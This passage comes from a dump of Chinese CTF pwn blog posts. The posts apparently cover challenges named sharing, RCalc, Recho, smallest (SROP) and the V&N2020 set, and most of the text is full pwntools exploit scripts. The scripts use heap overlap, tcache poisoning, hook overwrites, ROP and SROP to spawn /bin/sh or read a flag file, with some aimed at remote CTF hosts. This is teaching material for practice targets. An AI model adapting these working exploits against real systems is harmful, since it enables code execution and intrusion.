    res += chr(payload[i] ^ key[i % 8])        print(hex(ord(res[len(res) - 1])))    return bytes(res, encoding=&#x27;ISO-8859-1&#x27;)r.recvuntil(b&#x27;Welcome to the Pokemon world, input your name: &#x27;)r.sendline(b&#x27;196082&#x27;)for i in range(7):    create(1, 0x220)    delete(0)    create(1, 0x300)    delete(0)    create(1, 0x310)    delete(0)create(1, 0x220)create(1, 0x300, 1)delete(0)create(1, 0x300)create(1, 0x300)create(1, 0x300)create(1, 0x300)delete(0)create(2)edit(0, p64(0xdeadbeef) * 16 * 2 + p64(0) + p64(0xc40 + 1))delete(1)delete(0, True)create(1, 0x300)create(1, 0x300, 1)delete(1)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;]&#x27;)r.sendline(b&#x27;1&#x27;)create(1, 0x310, 1)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;gem: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))r.recvuntil(b&#x27;[Y/N]&#x27;)r.sendline(b&#x27;N&#x27;)malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]delete(1)create(1, 0x300, 0)create(3, idx=1)edit(1,     p8(0xaa) * 8 + p64(libc_base + libc.symbols[&#x27;__free_hook&#x27;] - 8) + b&#x27;\\n&#x27;)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;[Y/N]&#x27;)r.sendline(b&#x27;Y&#x27;)r.recvuntil(b&#x27;Please give the evolution password: &#x27;)print(b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.symbols[&#x27;system&#x27;]))r.send(    xor(b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.symbols[&#x27;system&#x27;]),        p8(0xaa) * 8))delete(0)# gdb.attach(r)r.interactive()\n\nsharing相较于上一道题，这道题的难度可以说是十分简单，但是很烦的一点就是这道题目使用cpp写的，我对于cpp的逆向一直都不知道怎么入手，所以去问了大师傅，大师傅说对于cpp的逆向先是用ida搞清楚基本的功能，程序的特性利用动态调试来挖掘不过愚钝的我也不明白这道题到底是怎么想到create的idx相同时会free掉当前idx已存在的chunk，可能这就是经验积累吧。\n这道题知道了这样会free的话就很好做了这里就只贴exp了。\nfrom pwn import *elf = ELF(&#x27;./sharing&#x27;)r = process(&#x27;./sharing&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def create(idx, size):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;1&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;Sz: &#x27;, bytes(str(size), encoding=&#x27;utf8&#x27;))def move(from_idx, to_idx):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;2&#x27;)    r.sendlineafter(b&#x27;From: &#x27;, bytes(str(from_idx), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;To: &#x27;, bytes(str(to_idx), encoding=&#x27;utf8&#x27;))def show(idx):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;3&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;4&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.sendafter(b&#x27;Content: &#x27;, content)def hint(addr):    r.sendlineafter(b&#x27;Choice: &#x27;, bytes(str(0xdead), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;Hint: &#x27;, p32(0x2F767991) + p32(0) * 3)    r.sendlineafter(b&#x27;Addr: &#x27;, bytes(str(addr), encoding=&#x27;utf8&#x27;))create(0, 0x500)create(1, 0x500)create(0, 0x510)create(2, 0x500)show(2)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]create(3, 0x80)create(4, 0x80)create(3, 0x90)create(4, 0x90)create(5, 0x80)show(5)heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(heap_addr))heap_base = heap_addr - 0x145a0create(6, 0x10)create(7, 0x10)create(8, 0x10)create(7, 0x30)create(8, 0x30)target = heap_base + 0x14930for i in range(40):    hint(target)edit(6, p64(libc_base + libc.symbols[&#x27;__free_hook&#x27;]))hint(heap_base + 0x10)hint(heap_base + 0x10)create(9, 0x10)create(10, 0x10)create(11, 0x10)edit(11, p64(libc_base + libc.symbols[&#x27;system&#x27;]))edit(6, b&#x27;/bin/sh\\x00&#x27;)move(7, 6)# gdb.attach(r)r.interactive()\n\n\n剩下的题本来想复现musl了但是没有题目，然后就是其他题目我是真的要疯了，md全是cpp我属实需要下去再学习一段时间，后面复现D3的kernel。\n","categories":["比赛复现"],"tags":["chunk overlapping"]},{"title":"RCalc","url":"/2021/12/26/RCalc/","content":"检查保护今年冲50篇博客看来是悬了，这玩意数论是真要了我的老命了 : (\n是真被xctf搞无语了，有时候环境创建不了就不说，居然题目给的libc版本和解题需要的版本不一致，去问Gyan大神估计都觉得我是个傻逼了。。。\n\n只打开了nx\n流程分析__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  sub_400A06();  alarm(0x78u);  sub_400FA2();  return 0LL;&#125;\n\nvoid *sub_400A06()&#123;  __int64 v0; // rbx  __int64 v1; // rbx  void *result; // rax  qword_6020F8 = malloc(0x10uLL);  if ( !qword_6020F8 )    exit(1);  qword_6020F0 = malloc(0x10uLL);  if ( !qword_6020F0 )    exit(1);  *qword_6020F8 = 0LL;  v0 = qword_6020F8;  *(v0 + 8) = malloc(0x100uLL);  *qword_6020F0 = 0LL;  v1 = qword_6020F0;  result = malloc(0x320uLL);  *(v1 + 8) = result;  return result;&#125;\n\n可以看到题目创建了几个chunk但是，注意一下chunk的创建顺序和结构就好\n__int64 sub_400FA2()&#123;  __int64 result; // rax  char v1[264]; // [rsp+0h] [rbp-110h] BYREF  __int64 v2; // [rsp+108h] [rbp-8h]  v2 = sub_400AAB();  printf(&quot;Input your name pls: &quot;);  __isoc99_scanf(&quot;%s&quot;, v1);  printf(&quot;Hello %s!\\nWelcome to RCTF 2017!!!\\n&quot;, v1);  puts(&quot;Let&#x27;s try our smart calculator&quot;);  sub_400E72();  result = sub_400B92();  if ( result != v2 )    sub_400BD4();  return result;&#125;\n\n这里存在一个栈溢出就是__isoc99_scanf(“%s”, v1);但是这里存在一个自主实现的canary保护\n__int64 sub_400AAB()&#123;  __int64 v0; // rbx  __int64 v1; // rsi  __int64 v2; // rdx  unsigned int ptr; // [rsp+Ch] [rbp-24h] BYREF  __int64 v5; // [rsp+10h] [rbp-20h]  FILE *stream; // [rsp+18h] [rbp-18h]  if ( *qword_6020F0 )  &#123;    ptr = *(*(qword_6020F0 + 8) + 8LL * *qword_6020F0 - 8);  &#125;  else  &#123;    stream = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);    fread(&amp;ptr, 1uLL, 4uLL, stream);    fclose(stream);  &#125;  srand(ptr);  v5 = rand();  v0 = v5 &lt;&lt; 32;  v5 = v0 | rand();  v1 = *(qword_6020F0 + 8);  v2 = (*qword_6020F0)++;  *(v1 + 8 * v2) = v5;  return v5;&#125;\n\n首先是这个，可以看到是将随机值放到chunk里面然后放到栈里面\n__int64 sub_400B92()&#123;  return *(*(qword_6020F0 + 8) + 8LL * (*qword_6020F0)-- - 8);&#125;\n\n通过这个拿到canary的值然后比较，自主实现的一个canary。\n我们再看在计算内部函数如果保存结果的话是保存在哪的\n__int64 __fastcall sub_400E39(__int64 a1)&#123;  __int64 v1; // rsi  __int64 v2; // rdx  __int64 result; // rax  v1 = *(qword_6020F8 + 8);  v2 = (*qword_6020F8)++;  result = a1;  *(v1 + 8 * v2) = a1;  return result;&#125;\n\n可以看到也是保存在chunk里面的，现在画个图基本就可以看出来了\n\n上面储存canary的值*(qword_6020F0 + 8)是放在这样一个chunk里面也就是最下面0x300的chunk里面的\n储存计算结果的值是放在*(qword_6020F8 + 8)这个chunk里面也就是0x100\n并且程序没有检测堆溢出，所以我们可以通过堆溢出覆盖掉下面存的canary然后就直接构造ROPgadget\n(需要注意的是不能使用puts_plt和puts_got，存在0x20会出现截断)\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&#x27;./RCalc&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)# r = process(&#x27;./RCalc&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 60200)# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]# context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000401123printf_plt = elf.plt[&#x27;printf&#x27;]__libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]ret_addr = 0x00000000004007femain_addr = 0x401036r.recvuntil(b&#x27;Input your name pls: &#x27;)payload = b&#x27;a&#x27;*(0x110-0x8)+p64(0)+p64(0) + \\    p64(pop_rdi)+p64(__libc_start_main_got)+p64(printf_plt)+p64(main_addr)r.sendline(payload)def add(one, two):    r.recvuntil(b&#x27;Your choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;input 2 integer: &#x27;)    r.sendline(bytes(str(one), encoding=&#x27;utf8&#x27;))    r.sendline(bytes(str(two), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Save the result?&#x27;)    r.sendline(b&#x27;yes&#x27;)for i in range(int(0x100/0x8)+3):    add(0, 0)# gdb.attach(r)r.recvuntil(b&#x27;Your choice:&#x27;)r.sendline(b&#x27;5&#x27;)__libc_start_main_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;__libc_start_main&#x27;, __libc_start_main_addr)libc_base = __libc_start_main_addr-libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libc_base+libc.dump(&#x27;system&#x27;)bin_sh_addr = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)print(bin_sh_addr)print(system_addr)r.recvuntil(b&#x27;Input your name pls: &#x27;)payload = b&#x27;a&#x27;*(0x110-0x8)+p64(0)+p64(0)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(system_addr)r.sendline(payload)for i in range(int(0x100/0x8)+3):    add(0, 0)r.recvuntil(b&#x27;Your choice:&#x27;)# gdb.attach(r)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["栈溢出"]},{"title":"Recho","url":"/2021/10/19/Recho/","content":"检查保护与分析\n64位只开了栈不可执行\n分析流程int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char nptr[16]; // [rsp+0h] [rbp-40h] BYREF  char buf[40]; // [rsp+10h] [rbp-30h] BYREF  int v6; // [rsp+38h] [rbp-8h]  int v7; // [rsp+3Ch] [rbp-4h]  Init(argc, argv, envp);  write(1, &quot;Welcome to Recho server!\\n&quot;, 0x19uLL);  while ( read(0, nptr, 0x10uLL) &gt; 0 )  &#123;    v7 = atoi(nptr);    if ( v7 &lt;= 15 )      v7 = 16;    v6 = read(0, buf, v7);    buf[v6] = 0;    printf(&quot;%s&quot;, buf);  &#125;  return 0;&#125;\n\nunsigned int Init()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  return alarm(0x3Cu);&#125;\n\n可以看到程序是让我们先写入0x10个字节然后把这个指针的值转化成int类型，然后在给buf写值，所以在while循环里面的read是可以进行栈溢出。\n但是只有当return但是输入0字节不得行，但是pwntools里面的shutdown函数可以解决，但是shutdown之后就会断开连接了，所以就要把所有东西搞到栈上。\n看了wp之后发现在data段有flag这个字符串，既然没法持续连接的话就只能直接输出flag，加之flag字符串有现成的所以可以读取文件然后输出就行，open()-&gt;read()-&gt;printf()这样一个流程。\n利用过程根据上面的流程，read和printf都有直接调用就行但是open没有，所以需要构造出open函数，但是函数是在shutdown之后就结束所以想爆出libc的位置是不可能了，只有篡改got表。\n\nalarm函数的内部的第三条语句就是syscall也就是系统调用，在linux的系统调用表里面alarm也就是0x25\n\n上面还有open\n是2就可以调用到open所以可以开始构造了，众所周知64位程序的函数参数少于七个的时候是在rdi, rsi, rdx, rcx, r8, r9上，直接开始构造ROP\n\n\npayload = b&#x27;a&#x27;*0x38# 这里就是篡改got表的地址，让got表直接指向syscall    我本地gdb调出来可以看到是0x9的偏移量，但是解题需要0x5主要是因为libc版本不一样payload += p64(pop_rax_addr)+p64(0x5)+p64(pop_rdi_addr) + \\    p64(alarm_got_addr)+p64(add_rdi_al_addr)# 这一步执行opne(&#x27;flag&#x27;,0)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(pop_rax_addr)+p64(0x2)+p64(alarm_plt_addr)# 这一步执行read(fb,stdin,0x30)payload += p64(pop_rdi_addr)+p64(0x3)+p64(pop_rsi_r15_addr) + \\ # 这里open的文件描述符一般从3开始    p64(stdin_addr)+p64(0)+p64(pop_rdx_addr)+p64(0x30)+p64(read_addr)# 这里调用printf(stdin)payload += p64(pop_rdi_addr)+p64(stdin_addr)+p64(printf_addr)\n\n\n\nexpfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/773a2d87b17749b595ffb937b4d29936&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 61160)r.recvuntil(b&#x27;Welcome to Recho server!&#x27;)r.sendline(str(0x200))pop_rax_addr = 0x00000000004006fcpop_rdi_addr = 0x00000000004008a3pop_rsi_r15_addr = 0x00000000004008a1pop_rdx_addr = 0x00000000004006feadd_rdi_al_addr = 0x000000000040070dprintf_addr = elf.plt[&#x27;printf&#x27;]read_addr = elf.plt[&#x27;read&#x27;]flag_addr = elf.symbols[&#x27;flag&#x27;]alarm_plt_addr = elf.plt[&#x27;alarm&#x27;]alarm_got_addr = elf.got[&#x27;alarm&#x27;]stdin_addr = elf.symbols[&#x27;stdin&#x27;]payload = b&#x27;a&#x27;*(0x30+0x8) + p64(pop_rax_addr)+p64(0x5)+p64(pop_rdi_addr) + \\    p64(alarm_got_addr)+p64(add_rdi_al_addr)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(pop_rax_addr)+p64(0x2)+p64(alarm_plt_addr)payload += p64(pop_rdi_addr)+p64(0x3)+p64(pop_rsi_r15_addr) + \\    p64(stdin_addr)+p64(0)+p64(pop_rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi_addr)+p64(stdin_addr)+p64(printf_addr)r.sendline(payload)r.shutdown(&#x27;send&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["stack-overflow","ROP","GOP表篡改"]},{"title":"SROP","url":"/2022/03/01/SROP/","content":"在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐这个博主，我这里就不在赘述了。\n题目:2016年-360春秋杯-srop赛题smallest        buu上面也有\n题目就是裸奔，除了堆栈不可执行都没开\n题目的代码也很简单，就在start存在\n\n我对于这个东西的理解：在调用sys_rt_sigreturn时，会将rsp所指向的位置当作sigFrame，以至于我们可以随便伪造sigFrame\n在实行SROP攻击的时候需要知道的几个条件：需要泄漏出一个栈地址，需要知道syscall的地址，需要控制rax\n利用过程r.send(p64(start_addr)*3)r.send(b&#x27;\\xb3&#x27;)r.recv(0x8)stack_addr = u64(r.recv(8))print(hex(stack_addr))\n\n首先泄漏栈地址，从上图可以看到start_addr=0x4000b0，我们首先写入三个start的地址到栈里面，然后进行下一个read，我们输入b’\\xb3’，那么这时候我们将我们写入的第二个start地址改成了0x4000b3，并且此时的rax为1，所以下一次就会输出0x400个栈上面的内容，借机泄漏栈地址。\nsigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;b&#x27;)r.send(payload)\n\n在第三个read的时候我们写入start的地址和伪造的sigframe，接着进入第四次read，随后写入syscall地址，然后补齐0xf个字节，然后就会执行sys_rt_sigreturn，并且此时的rsp正好指向了我们伪造的sigframe。\nbin_sh_addr = stack_addr+0x120sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_sh_addrsigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)print(hex(len(payload)))payload = payload.ljust(0x120, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;\\x00&#x27;)r.send(payload)\n\n此时，在执行完之后就会进入第五次read，此次read是我们构造的，所以rsi在我们已知的栈地址上面写入内容，所以使用同样的方法构造出execve。\n综上得出expfrom pwn import *elf = ELF(&#x27;./smallest&#x27;)r = process(&#x27;./smallest&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.arch = &#x27;amd64&#x27;start_addr = 0x4000B0syscall_addr = 0x4000BEr.send(p64(start_addr)*3)r.send(b&#x27;\\xb3&#x27;)r.recv(0x8)stack_addr = u64(r.recv(8))print(hex(stack_addr))sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;b&#x27;)r.send(payload)bin_sh_addr = stack_addr+0x120sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_sh_addrsigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)print(hex(len(payload)))payload = payload.ljust(0x120, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;\\x00&#x27;)r.send(payload)r.interactive()\n\n","categories":["pwn"],"tags":["SROP"]},{"title":"V&N2020 公开赛复现","url":"/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"总结一下:经过GFCTF的摧残打算复现一场较为简单的比赛了，虽然较为简单，但是也会有新东西学到哦。\nsimpleHeap第一题就是我前几天学得off by one漏洞。\nint sub_CBB()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 9 || !qword_2020A0[v1] )    exit(0);  printf(&quot;content:&quot;);  sub_C39(qword_2020A0[v1], dword_202060[v1]);  return puts(&quot;Done!&quot;);&#125;\n\n漏洞出现在edit函数内，可以多出一个字节。\n题目主要存在的难点应该是让你多试一下realloc地址应该偏移多少\nexpfrom pwn import *# r = process(&#x27;./vn_pwn_simpleHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 26488)elf = ELF(&#x27;./vn_pwn_simpleHeap&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def edit(id, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))create(0x68, b&#x27;a&#x27;*0x68)  # 0create(0x60, b&#x27;a&#x27;*0x60)  # 1create(0x60, b&#x27;a&#x27;*0x60)  # 2create(0x60, b&#x27;a&#x27;*0x60)  # 3edit(0, b&#x27;a&#x27;*0x60+p64(0x70)+p8(0xe0+1))delete(1)create(0x60, b&#x27;a&#x27;*0x60)  # 1show(2)main_arena_88 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4526acreate(0x60, b&#x27;a&#x27;*0x60)  # 4delete(2)delete(1)delete(4)create(0x60, p64(malloc_hook-0x20+5-8))  # 1create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*(0x20-5-8-8)+p64(one_gadget)+p64(realloc+0xc))# create(1, b&#x27;&#x27;)r.recvuntil(b&#x27;choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size?&#x27;)r.sendline(bytes(str(0x10), encoding=&#x27;utf-8&#x27;))info(hex(one_gadget))info(hex(realloc))# gdb.attach(r)# flag = flag&#123;e919bec8-e5a6-4c1d-a44a-282f08c57c06&#125;r.interactive()\n\neasyTHeap这道题漏洞发生在delete函数内，没有清楚指针造成UAF\nint sub_D2C()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 6 || !*(&amp;unk_202080 + v1) )    exit(0);  free(*(&amp;unk_202080 + v1));  dword_202060[v1] = 0;  return puts(&quot;Done!&quot;);&#125;\n\n通过UAF得到tcache struct chunk的地址，再利用double free实现控制tcache struct chunk，进行tcache struct attack。这道题和GFCTF那道题很类似，不过这道简单一点，这里就不赘述可以去看复现GFCTF的那一篇 https://cv196082.gitee.io/2022/01/11/GFCTF/ \nexpfrom pwn import *# r = process(&#x27;./vn_pwn_easyTHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 25768)elf = ELF(&#x27;./vn_pwn_easyTHeap&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(content)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))create(0x50)  # 0delete(0)delete(0)show(0)tcache_struct_addr = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))-0x250print(hex(tcache_struct_addr))create(0x50)  # 1edit(1, p64(tcache_struct_addr))# delete(2)create(0x50)  # 2create(0x50)  # 3  tcache_structedit(3, b&#x27;a&#x27;*0x28)delete(3)show(3)main_arena_96 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)print(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc_addr = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4f322create(0x60)  # 4edit(4, b&#x27;\\x00&#x27;*0x40+p64(0)*2+p64(malloc_hook-8))create(0x30)  # 5edit(5, p64(one_gadget)+p64(realloc_addr+8))# gdb.attach(r)create(1)r.interactive()# flag:flag&#123;ce977aa0-80c8-48c6-a1d0-24ec4f55ce17&#125;\n\nwarmup题目很简单，不过需要gdb调试一下，调试一下会发现，第一个不存在栈溢出的函数和第二个存在栈溢出的函数的两个栈地址是相邻的。\nexpfrom pwn import *r = remote(&#x27;node4.buuoj.cn&#x27;, 26531)#r = process(&#x27;./vn_pwn_warmup&#x27;)elf = ELF(&#x27;./vn_pwn_warmup&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(&#x27;gift: &#x27;)puts_addr = int(r.recvline()[:-1], 16)libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]pop_rdi_ret = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))open_addr = libc_base + libc.symbols[&#x27;open&#x27;]read_addr = libc_base + libc.symbols[&#x27;read&#x27;]free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]payload = b&#x27;a&#x27;*0x70 + b&#x27;b&#x27;*0x8payload += p64(pop_rdi_ret)payload2 = p64(0) + p64(pop_rsi_ret) + p64(free_hook) + \\    p64(pop_rdx_ret) + p64(4) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + \\    p64(pop_rsi_ret) + p64(0) + p64(open_addr)payload2 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + \\    p64(free_hook) + p64(pop_rdx_ret) + p64(100) + p64(read_addr)payload2 += p64(pop_rdi_ret) + p64(free_hook) + p64(puts_addr)r.recvuntil(&#x27;something: &#x27;)r.send(payload2)r.recvuntil(&#x27;name?&#x27;)r.send(payload)r.send(&#x27;flag&#x27;)r.interactive()# flag:flag&#123;963b2367-7364-44bf-8352-2c5552e4219e&#125;\n\nbabybabypwn这一个是最头疼的，不过我写的exp后面改得和其他wp一样也是打不通就很烦。\n这道题使用的是SROP攻击，原理我还没怎么看懂，不过做题我应该能做出来，所以我就放个exp，后面会把SROP的原理和相关例题在做一篇博客。\nexpfrom pwn import *context(os=&#x27;Linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# r = process(&#x27;./vn_pwn_babybabypwn_1&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 29297)elf = ELF(&#x27;./vn_pwn_babybabypwn_1&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)r.recvuntil(b&#x27;Here is my gift: 0x&#x27;)puts_addr = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), 16)libc_base = puts_addr-libc.symbols[&#x27;puts&#x27;]info(hex(libc_base))libc_bss = libc.bss()+libc_base+0x100pop_rdi = libc_base + 0x21102pop_rsi = libc_base + 0x202e8pop_rdx = libc_base + 0x1b92read_addr = libc.symbols[&#x27;read&#x27;]+libc_baseopen_addr = libc.symbols[&#x27;open&#x27;]+libc_basewrite_addr = libc.symbols[&#x27;write&#x27;]+libc_baser.recvuntil(b&#x27;Please input magic message: &#x27;)frame = SigreturnFrame()frame.rdi = 0frame.rsi = libc_bssframe.rdx = 0x100frame.rip = read_addrframe.rsp = libc_bssr.send(bytes(str(frame), encoding=&#x27;utf8&#x27;)[8:])flag_addr = libc_bss+0x98payload = p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(read_addr)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi) + \\    p64(libc_bss)+p64(pop_rdx)+p64(0x40)+p64(write_addr)payload += 